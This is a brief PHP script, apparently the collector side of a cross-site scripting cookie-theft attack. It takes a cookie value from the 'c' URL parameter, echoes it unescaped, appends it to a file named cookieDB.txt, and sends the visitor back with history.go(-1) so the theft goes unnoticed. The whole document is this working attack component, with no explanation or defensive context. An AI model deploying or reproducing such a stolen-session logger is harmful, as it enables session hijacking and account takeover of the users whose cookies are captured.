<?php
   $cookie = $_GET['c'];
   echo $cookie;
   $file = fopen("cookieDB.txt","a");
   fwrite($file,$cookie."\n");
   fclose($file);
   echo "<script>history.go(-1)</script>";
?>
